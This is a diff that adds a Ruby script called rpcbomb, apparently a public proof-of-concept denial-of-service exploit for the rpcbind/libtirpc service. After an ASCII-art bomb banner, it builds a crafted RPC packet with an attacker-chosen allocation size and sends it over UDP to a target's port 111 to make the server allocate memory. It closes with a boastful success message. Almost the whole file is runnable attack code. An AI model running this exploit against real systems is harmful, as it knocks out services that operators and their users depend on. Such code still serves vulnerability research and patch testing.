@@ -1,0 +1,89 @@
+#!/usr/bin/ruby
+#
+# Source: https://raw.githubusercontent.com/guidovranken/rpcbomb/fe53048af2d4fb78c911e71a30f21afcffbbf5e1/rpcbomb.rb
+#
+# By Guido Vranken https://guidovranken.wordpress.com/
+# Thanks to Sean Verity for writing an exploit in Ruby for an earlier
+# vulnerability: https://www.exploit-db.com/exploits/26887/
+# I've used it as a template.
+
+require 'socket'
+def usage
+        abort "\nusage: ./rpcbomb.rb <target> <# bytes to allocate> [port]\n\n"
+end
+bomb = """
+                               ` + # ,         
+                           : @ @ @ @ @ @       
+               @ @ ; . + @ @ @ .       @ @     
+                 @ @ @ @ @ `           @ @     
+                                 . `   @ #     
+                     ; @ @ @ . : @ @ @ @       
+                 @ @ @ @ @ @ @ @ @ @ @ ;       
+               @ @ @ @ @ @ @ @ @ @ @ @ @ `     
+             @ @ @ @ @ @ @ @ @ @ @ @ @ @ :     
+           # @ @ @ @ @ @ @ @ @ @ @ @ @ '       
+           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
+         . @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
+         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
+         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
+         : @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
+           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
+           @ @ @ @ @ @ @ @ @ @ @ @ @ @ ,       
+             @ @ @ @ @ @ @ @ @ @ @ @ @         
+             , @ @ @ @ @ @ @ @ @ @ @           
+               ` @ @ @ @ @ @ @ @ @             
+                   , @ @ @ @ @  
+     r p c b o m b
+
+     DoS exploit for *nix rpcbind/libtirpc.
+
+     (c) 2017 Guido Vranken.
+
+     https://guidovranken.wordpress.com/
+
+"""
+
+puts bomb
+
+if ARGV.length >= 2
+    begin
+        host = ARGV[0]
+        numBytes = Integer(ARGV[1])
+        port = ARGV.length == 3 ? Integer(ARGV[2]) : 111
+    rescue
+        usage
+    end
+
+    pkt = [0].pack('N')         # xid
+    pkt << [0].pack('N')        # message type CALL
+    pkt << [2].pack('N')        # RPC version 2
+    pkt << [100000].pack('N')   # Program
+    pkt << [4].pack('N')        # Program version
+    pkt << [9].pack('N')        # Procedure
+    pkt << [0].pack('N')        # Credentials AUTH_NULL
+    pkt << [0].pack('N')        # Credentials length 0
+    pkt << [0].pack('N')        # Credentials AUTH_NULL
+    pkt << [0].pack('N')        # Credentials length 0
+    pkt << [0].pack('N')        # Program: 0
+    pkt << [0].pack('N')        # Ver
+    pkt << [4].pack('N')        # Proc
+    pkt << [4].pack('N')        # Argument length
+    pkt << [numBytes].pack('N') # Payload
+
+    s = UDPSocket.new
+    s.send(pkt, 0, host, port)
+
+    sleep 1.5
+
+    begin
+        s.recvfrom_nonblock(9000)
+    rescue
+        puts "No response from server received."
+        exit()
+    end
+
+    puts "Allocated #{numBytes} bytes at host #{host}:#{port}.\n" +
+        "\nDamn it feels good to be a gangster.\n\n"
+else
+    usage
+end
